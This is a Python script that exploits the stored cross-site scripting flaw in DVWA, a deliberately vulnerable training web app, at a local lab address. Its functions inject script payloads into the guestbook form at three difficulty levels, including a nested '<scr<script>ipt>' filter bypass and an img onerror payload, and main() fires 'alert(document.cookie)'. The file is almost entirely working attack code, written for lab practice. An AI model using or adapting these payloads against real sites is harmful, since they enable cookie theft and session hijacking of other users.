"""
    
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

def exploit_low(sess, js_pay, msg_title=""):
    pay = "<script>"+js_pay+"</script>"
    
    payload = {
        "txtName":msg_title,
        "mtxMessage":pay,
        "btnSign":"btnSign"
    }
    
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/xss_s/", data=payload)
def exploit_med(sess, js_pay, msg_body=""):
    pay = "<script>"+js_pay+"</script>"
    pay = pay.replace("<script>", "<scr<script>ipt>")
    payload = {
        "txtName":pay,
        "mtxMessage":msg_body,
        "btnSign":"btnSign"
    }
    
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/xss_s/", data=payload)
def exploit_high(sess, js_pay, msg_body=""):
    pay = "<img src/" # we load an image that doesn't exists
    pay += " onerror=" # thus it will trigger an error and will execute our payload
    pay += js_pay # this payload
    pay += ">" # then we close the <img> tag
    payload = {
        "txtName":pay,
        "mtxMessage":msg_body,
        "btnSign":"btnSign"
    }
    
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/xss_s/", data=payload)

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    exploit_high(sess, "alert(document.cookie)")
    print("Payload sent !")
    
main()